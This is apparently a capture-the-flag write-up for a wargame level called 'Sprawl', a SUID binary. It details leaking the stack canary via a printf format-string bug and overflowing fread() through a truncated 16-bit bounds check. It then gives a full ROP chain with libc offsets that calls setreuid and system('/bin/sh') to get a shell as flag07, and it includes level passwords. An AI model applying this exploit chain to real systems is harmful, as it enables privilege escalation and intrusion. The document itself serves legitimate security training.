# level07 — "Sprawl" — Format-String Canary Leak → Truncated-Bounds-Check `fread()` Overflow

## Concept

`./sprawl`, SUID owned by `flag07`, home dir `/home/level07/`. Same
overall shape as level06 (a canary, defeated via a format-string leak in
one function, then an overflow in another) but the overflow primitive
itself is more interesting: a classic "the bounds check validates a
different value than the one actually used" bug in a network-packet-
themed `fread()` call.

## Recon

Login: `ssh level07@127.0.0.1 -p 4244`, password = level06's flag
(`c1t0kg9pklac7x4c7sn7iqgfppkz4usq`).

No source (same as level06). `nm ./sprawl` lists: `print_banner`,
`route_tag`, `process_packet`, `read_header`, `calc_checksum`,
`dump_packets`, called from `main` in that order (via
`gdb -batch -ex 'disas main'`).

`checksec`: Partial RELRO, canary found, NX enabled, no PIE. `ldd` →
same libc base as every prior level. `getent passwd flag07` → uid
1024 (checked fresh).

Disassembling the key functions:

- `route_tag()`: `fgets(buf, 0x80, stdin)` into a 144-byte buffer —
  bounded, no overflow — then `printf(buf)` directly. Another
  format-string bug, safe to use purely as a read primitive.
- `read_header(hdr)`: `scanf("%x %hx %hx", &hdr.magic, &hdr.A, &hdr.B)`
  (format string confirmed via `x/s 0x4020aa`) into a 3-field struct;
  returns `-1` unless exactly 3 fields were read AND `hdr.magic ==
  0xdeadbeef` (a literal compare, confirmed via `cmp $0xdeadbeef,%eax`).
- `process_packet()`: calls `read_header`, then computes
  `edx=hdr.A; eax=hdr.B; imul edx,eax` — a 32-bit multiply — but stores
  only the low 16 bits of the product (`mov %ax,-0x6a(%rbp)`), and
  checks that truncated value with `cmpw $0x40,...; jbe` (must be
  ≤ 64). Separately, a few instructions later, `hdr.A` itself
  (zero-extended to 64 bits, not the product, and not re-checked)
  is used directly as the `nmemb`/size argument to
  `fread(buf, 1, hdr.A, stdin)`, where `buf` is at `rbp-0x50` in a frame
  with the canary at `rbp-0x8` — only 72 bytes of genuinely safe
  space (`0x50 - 0x8`).

## Retrieving the addresses, command by command

The bounds check in `process_packet` validates `(hdr.A * hdr.B) mod
65536 <= 64`, not `hdr.A` itself — the value actually passed to
`fread(buf, 1, hdr.A, stdin)`. Setting `B = 0` makes the checked
product trivially `0`, leaving `A` free to be any 16-bit value up to
65535, far past the 72 safe bytes between `buf` and the canary. This
was confirmed with the standard two-step canary check: a deliberately
wrong canary byte produces `*** stack smashing detected ***`/SIGABRT,
and a correctly leaked canary with garbage return bytes produces a
clean SIGSEGV instead.

The canary itself leaks through `route_tag`'s `printf(buf)`; probing
increasing `%N$p` indices for a value with a `0x00` low byte lands on
argument index 23 (index 27 shows the same value, aliasing the same
stack slot), stable across repeated runs.

`process_packet` calls `getchar()` once between `read_header` and
`fread` as a "press enter" gate. Since `scanf("%x %hx %hx")` doesn't
consume trailing whitespace, the newline typed after the header line
is still sitting in stdin's buffer, and that's exactly what
`getchar()` eats — so the header line and the overflow payload can be
sent back-to-back with no extra padding byte between them.

The offset from `buf` to the canary is 72 bytes; 8 more junk bytes
cover the saved rbp before the ROP chain begins, reusing every gadget
address already established in earlier levels (`pop rdi ; ret` at
libc+0x10f78b, `pop rsi ; pop rbp ; ret` at libc+0x2b46b, `setreuid`
at libc+0x1270d0, `"/bin/sh"` at libc+0x1cb42f, `system` at
libc+0x58750). The alignment-fixup count that makes the final
`system()` call land correctly is `n_extra_ret = 1`, confirmed by the
spawned shell reporting `uid=1024(flag07)`.

## Exploit

Two-stage interactive session (see `exploit.py`):

```
$ ./sprawl
[SPRAWL] Route tag: %23$p                 <- canary leak probe
[SPRAWL] Routing via 0xa08cfc4a94548300   <- canary, parsed from this line
[SPRAWL] Header (hex): deadbeef a8 0      <- magic, A=len(payload) in hex, B=0
[SPRAWL] Transmit (N bytes): <getchar, eats header's \n> <payload>
```

Payload (offset 72 to canary, `process_packet`'s frame):
```
  72 bytes junk
  <leaked canary>
  8 bytes junk              (saved rbp, unused)
  pop rdi ; ret            (libc +0x10f78b)
  1024                     (flag07's real uid)
  pop rsi ; pop rbp ; ret  (libc +0x2b46b)
  1024
  0                        (junk, popped into rbp)
  setreuid                 (libc +0x1270d0)
  pop rdi ; ret
  BINSH                    (libc +0x1cb42f, "/bin/sh")
  ret                      (libc +0x2882f, ONE alignment fixup)
  system                   (libc +0x58750)
```

```
$ id
uid=1024(flag07) gid=1010(level07) groups=1010(level07),1001(levelgroup)
$ cat /home/flag07/.pass
s3cgzrg5q78t6xx73ljvm3m2zfwk02ix
```

Verified: this string works as level08's SSH password.

